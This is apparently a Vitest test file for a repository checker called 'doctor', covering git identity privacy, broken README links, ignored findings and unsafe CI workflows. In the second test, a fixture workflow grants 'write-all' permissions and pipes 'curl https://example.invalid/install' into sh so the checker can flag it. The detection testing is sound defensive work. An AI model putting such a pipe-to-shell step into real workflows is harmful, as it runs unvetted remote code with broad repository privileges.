import { mkdir, writeFile } from 'node:fs/promises';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import { doctor } from '../src/doctor.js';
import { git, initializeRepository, temporaryDirectory } from './helpers.js';

describe('doctor', () => {
  it('finds privacy-safe repository state without exposing identity values', async () => {
    const root = await temporaryDirectory();
    await initializeRepository(root);
    await git(root, 'remote', 'add', 'origin', 'https://github.com/RepoEnjoyer/RepoMend.git');

    const report = await doctor({ root });
    const identity = report.findings.find((item) => item.id === 'privacy.git-identity');

    expect(identity?.level).toBe('pass');
    expect(JSON.stringify(report)).not.toContain('@users.noreply.github.com');
    expect(report.repository).not.toContain(root);
  });

  it('detects broken README links and unsafe workflows', async () => {
    const root = await temporaryDirectory();
    await initializeRepository(root);
    await writeFile(join(root, 'README.md'), '# Fixture\n\n![Missing](docs/missing.png)\n', 'utf8');
    await mkdir(join(root, '.github', 'workflows'), { recursive: true });
    await writeFile(
      join(root, '.github', 'workflows', 'ci.yml'),
      'name: CI\non: [push]\npermissions: write-all\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl https://example.invalid/install | sh\n',
      'utf8',
    );

    const report = await doctor({ root });
    const byId = new Map(report.findings.map((item) => [item.id, item]));

    expect(byId.get('docs.relative-links')?.level).toBe('fail');
    expect(byId.get('workflow.write-all')?.level).toBe('fail');
    expect(byId.get('workflow.remote-shell')?.level).toBe('fail');
  });

  it('honors ignored finding identifiers', async () => {
    const root = await temporaryDirectory();
    await initializeRepository(root);
    await writeFile(
      join(root, '.repomend.json'),
      JSON.stringify({ version: 1, ignore: ['community.changelog'], failOnWarnings: false }),
      'utf8',
    );

    const report = await doctor({ root });
    expect(report.findings.some((item) => item.id === 'community.changelog')).toBe(false);
  });
});
